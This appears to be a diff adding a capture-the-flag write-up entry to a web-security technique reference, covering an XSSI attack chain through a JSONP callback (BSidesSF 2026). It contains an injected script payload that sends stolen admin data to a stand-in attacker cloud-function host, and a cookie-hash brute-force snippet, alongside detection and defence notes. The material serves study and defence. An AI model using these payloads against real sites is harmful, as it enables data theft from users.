@@ -36,6 +36,7 @@
 - [Terminal Control Character Obfuscation (SECCON 2015)](#terminal-control-character-obfuscation-seccon-2015)
 - [CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)](#csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025)
 - [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
+- [XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)](#xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026)
 
 ---
 
@@ -670,3 +671,44 @@ fetch('/api/flag')
 **Detection:** Check CSP for `script-src 'nonce-...'` combined with missing `base-uri` directive. Look for nonced `<script src="relative.js">` tags (relative URL, not absolute) that appear after a potential injection point.
 
 **References:** BSidesSF 2026 "web-tutorial-2"
+
+---
+
+## XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)
+
+**Pattern (three-questions-3):** Multi-stage attack chain:
+1. **Cookie hash inversion:** User ID cookie is `SHA1(numeric_id)` where ID is a small integer (1-100000). Brute-force the hash to recover the numeric ID.
+2. **IDOR on debug endpoint:** `/debug/game-state?user_id=<numeric_id>` returns game state (discovered via HTML comments + robots.txt).
+3. **XSSI exfiltration:** The admin's game state is exfiltrated via Cross-Site Script Inclusion. A JSONP-like endpoint (`/characters.js?callback=leak`) wraps response data in a function call. Inject a `<script src>` tag via an admin message feature that loads this endpoint with a custom callback, which forwards the data to an attacker-controlled cloud function.
+
+```html
+<!-- Injected via /admin-message endpoint -->
+<script>
+function leak(data) {
+    // Exfiltrate to attacker's cloud function
+    new Image().src = "https://attacker.cloudfunctions.net/exfil?d=" +
+        encodeURIComponent(JSON.stringify(data));
+}
+</script>
+<script src="/characters.js?callback=leak"></script>
+```
+
+```python
+# Step 1: Brute-force SHA1 cookie to recover numeric user ID
+import hashlib
+
+cookie_hash = "a1b2c3d4..."  # From document.cookie
+for i in range(1, 100001):
+    if hashlib.sha1(str(i).encode()).hexdigest() == cookie_hash:
+        print(f"User ID: {i}")
+        break
+
+# Step 2: Access debug endpoint
+# GET /debug/game-state?user_id={recovered_id}
+```
+
+**Key insight:** XSSI (Cross-Site Script Inclusion) exploits endpoints that return JavaScript (JSONP callbacks, JS variable assignments) containing sensitive data. Unlike XSS, XSSI doesn't require injecting script into the target page -- it loads the target's script cross-origin. The `callback` parameter in JSONP endpoints is the classic vector. Combined with an admin bot that visits attacker-controlled pages, this enables server-side data exfiltration.
+
+**When to recognize:** Application has JSONP endpoints or serves JavaScript files with dynamic data. CSP may allow `script-src` from same origin. Look for `?callback=` or `?jsonp=` parameters. The attack chain typically combines: weak cookie hashing -> IDOR -> XSSI -> OOB exfiltration.
+
+**Defense:** Disable JSONP/callback parameters. Return `Content-Type: application/json` (not `application/javascript`). Add `X-Content-Type-Options: nosniff`. Use CORS properly instead of JSONP.
